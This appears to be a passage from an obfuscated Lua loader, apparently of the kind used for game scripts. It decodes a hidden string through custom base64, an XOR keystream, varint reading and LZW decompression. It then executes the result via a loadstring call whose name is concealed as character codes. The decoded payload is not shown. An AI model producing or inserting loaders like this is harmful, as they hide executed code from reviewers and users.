local c={}
for d=1,#b do c[#c+1]=a[b[d]]end
local e=table.concat(c)
local f="GnK!6h5.R+4rvm3bxzfBYLTp2kUyO9P_CwgV8XMjZJSWeq0FDd7~ucoNQlt/Hs1E"
local g={}
for h=1,#f do g[f:sub(h,h)]=h-1 end
local j={}
for k=1,#e,4 do
local l=e:sub(k,k)
local m=e:sub(k+1,k+1)
local n=e:sub(k+2,k+2)
local o=e:sub(k+3,k+3)
local p=g[l]or 0
local q=g[m]or 0
local r=g[n]or 0
local s=g[o]or 0
j[#j+1]=string.char(p*4+math.floor(q/16))
if n~="="then j[#j+1]=string.char((q%16)*16+math.floor(r/4))end
if o~="="then j[#j+1]=string.char((r%4)*64+s)end
end
local t=table.concat(j)
local u={}
local v=62267
for w=1,#t do
v=(v*109+1021)%65536
u[w]=string.char(bit32.bxor(t:byte(w),(v+math.floor(v/256))%256))
end
local x=table.concat(u)
local y={}
local z=0
local aa=1
for ab=1,#x do
local ac=x:byte(ab)
z=z+(ac%128)*aa
if ac<128 then y[#y+1]=z;z=0;aa=1 else aa=aa*128 end
end
local ad={}
for ae=0,255 do ad[ae]=string.char(ae)end
local af=ad[y[1]]
local ag={af}
local ah=256
for aj=2,#y do
local ak=y[aj]
local al=ad[ak]
if not al and ak==ah then al=af..af:sub(1,1)end
if not al then return end
ag[#ag+1]=al
ad[ah]=af..al:sub(1,1)
ah=ah+1
af=al
end
local am=(getfenv and getfenv()or _G)[string.char(108,111,97,100,115,116,114,105,110,103)]
return am(table.concat(ag))()
